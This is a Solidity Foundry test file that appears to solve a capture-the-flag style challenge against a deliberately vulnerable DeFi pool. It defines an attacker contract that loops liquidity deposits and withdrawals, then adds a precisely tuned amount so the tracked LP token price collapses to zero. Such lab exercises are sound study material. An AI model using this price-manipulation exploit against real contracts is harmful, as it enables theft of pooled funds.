// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {ReadOnlyPool, VulnerableDeFiContract} from "../src/ReadOnly.sol";

pragma solidity ^0.8.0;

contract ReadOnlyTest is Test {
    ReadOnlyPool readOnlyPool;
    VulnerableDeFiContract vulnerableDeFiContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 1000 ether);
        vm.prank(victim);
        readOnlyPool = new ReadOnlyPool();
        vulnerableDeFiContract = new VulnerableDeFiContract(readOnlyPool);
        readOnlyPool.addLiquidity{value: 100 ether}();
        readOnlyPool.earnProfit{value: 1 ether}();
        vulnerableDeFiContract.snapshotPrice();

        vm.deal(attacker, 2 ether);
    }

    function testReadOnly() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.startPrank(attacker);
        ReadOnlyAttacker readOnlyAttacker = new ReadOnlyAttacker(readOnlyPool, vulnerableDeFiContract);
        readOnlyAttacker.attack{value: 2 ether}();
        vm.stopPrank();

        console.log(vulnerableDeFiContract.lpTokenPrice());
        assertEq(vulnerableDeFiContract.lpTokenPrice(), 0);
        assert(vm.getNonce(attacker) < currentNonce + 3);
    }
}

contract ReadOnlyAttacker {
    ReadOnlyPool public readOnlyPool;
    VulnerableDeFiContract public vulnerableDeFiContract;

    constructor(ReadOnlyPool _readOnlyPool, VulnerableDeFiContract _vulnerableDeFiContract) {
        readOnlyPool = _readOnlyPool;
        vulnerableDeFiContract = _vulnerableDeFiContract;
    }

    function attack() public payable {
        for (uint256 i = 0; i < 56; i++) {
            readOnlyPool.addLiquidity{value: address(this).balance}();
            readOnlyPool.removeLiquidity();
        }

        // took me 30 minutes to approximate the value instead of doing a quadratic equation LMAO
        readOnlyPool.addLiquidity{value: 44.263155160165416851 ether}();
        readOnlyPool.removeLiquidity();
        vulnerableDeFiContract.snapshotPrice();
    }

    receive() external payable {}
}
